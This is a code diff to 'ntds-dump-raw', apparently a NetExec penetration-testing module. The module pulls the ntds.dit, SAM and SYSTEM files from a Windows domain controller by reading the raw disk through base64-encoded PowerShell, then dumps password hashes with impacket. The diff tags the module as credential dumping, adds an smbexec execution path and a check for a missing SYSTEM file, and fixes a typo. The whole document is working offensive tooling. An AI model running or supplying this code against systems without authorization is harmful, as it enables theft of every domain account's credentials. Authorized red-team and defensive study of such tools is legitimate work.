@@ -11,7 +11,7 @@ import random
 import gzip
 from io import BytesIO
 from impacket.examples.secretsdump import LocalOperations, NTDSHashes, SAMHashes, LSASecrets
-from nxc.helpers.misc import validate_ntlm
+from nxc.helpers.misc import CATEGORY, validate_ntlm
 from nxc.helpers.powershell import get_ps_script
 import sys
 
@@ -20,6 +20,9 @@ class NXCModule:
     name = "ntds-dump-raw"
     description = "Extracting the ntds.dit, SAM, and SYSTEM files from DC by accessing the raw hard drive."
     supported_protocols = ["smb", "wmi", "winrm"]
+    category = CATEGORY.CREDENTIAL_DUMPING
+
+    # Module constants
     NTFS_LOCATION = 0
     MFT_LOCATION = 0
     context = None
@@ -112,8 +115,10 @@ class NXCModule:
         # scary base64 powershell code :)
         # This to read the PhysicalDrive0 file
         get_data_script = f"""powershell.exe -c "$base64Cmd = '{self.ps_script_b64}';$decodedCmd = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($base64Cmd)) + '; read_disk {offset} {fixed_size}'; Invoke-Expression $decodedCmd" """
-        if self.connection.__class__.__name__ == "wmi":  # noqa: SIM108
+        if self.connection.__class__.__name__ == "wmi":
             data_output = self.connection.execute_psh(get_data_script, True)
+        elif self.connection.__class__.__name__ == "smb":
+            data_output = self.execute(get_data_script, True, ["smbexec"])
         else:
             data_output = self.execute(get_data_script, True)
         self.logger.debug(f"{offset=},{size=},{fixed_size=}")
@@ -171,8 +176,11 @@ class NXCModule:
         if self.number_of_file_to_extract != 0:
             self.logger.fail("Unable to find all needed files, trying to work with what we have")
 
-        self.logger.success("Heads up, hashes on the way...")
-        self.dump_hashes()
+        if "SYSTEM" in self.extracted_files_location_local and self.extracted_files_location_local["SYSTEM"] != "":
+            self.logger.success("Heads up, hashes on the way...")
+            self.dump_hashes()
+        else:
+            self.logger.fail("SYSTEM file not found, unable to proceed with hash extraction")
 
     def dump_hashes(self):
         """Dumping NTDS and SAM hashes locally from the extracted files"""
@@ -511,10 +519,10 @@ class NXCModule:
         parsed_header = self.parse_MFT_header(curr_sector[Offset_to_the_first_attribute:])
 
         if "$FILE_NAME" in parsed_header:
-            filename_lenght = self.bytes_to_int_signed(parsed_header["$FILE_NAME"][0x58: 0x58 + 1])
+            filename_length = self.bytes_to_int_signed(parsed_header["$FILE_NAME"][0x58: 0x58 + 1])
             curr_MFA_sector.parent_record_number = self.bytes_to_int_unsigned(parsed_header["$FILE_NAME"][0x18: 0x18 + 3] + b"\x00")
 
-            curr_MFA_sector.filename = parsed_header["$FILE_NAME"][0x58 + 2: 0x58 + 2 + (filename_lenght * 2)].decode("utf-16")
+            curr_MFA_sector.filename = parsed_header["$FILE_NAME"][0x58 + 2: 0x58 + 2 + (filename_length * 2)].decode("utf-16")
 
         if "$DATA" in parsed_header:
             dataRun_offset = self.bytes_to_int_signed(parsed_header["$DATA"][0x20: 0x20 + 1])
